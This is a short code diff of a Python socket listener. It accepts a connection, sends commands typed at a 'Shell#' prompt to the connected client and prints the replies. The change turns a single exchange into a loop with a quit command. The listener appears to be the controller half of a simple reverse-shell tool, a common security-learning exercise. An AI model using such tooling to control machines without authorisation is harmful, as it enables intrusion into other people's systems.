@@ -12,10 +12,13 @@ print("listening for incoming connection")
 target , ip = s.accept() # accept the connection
 print("connected")
 
-
-# command to send to client (input)
-command = raw_input("* Shell#~%s: " % str(ip))
-target.send(command) # this function send command to client
-result = target.recv(1024) #  send bytes
-print(result)
+while True:
+	# command to send to client (input)
+	command = raw_input("* Shell#~%s: " % str(ip))
+	target.send(command) # this function send command to client
+	if command == "q":
+		break
+	else:
+		result = target.recv(1024) #  receive bytes
+		print(result)
 s.close()
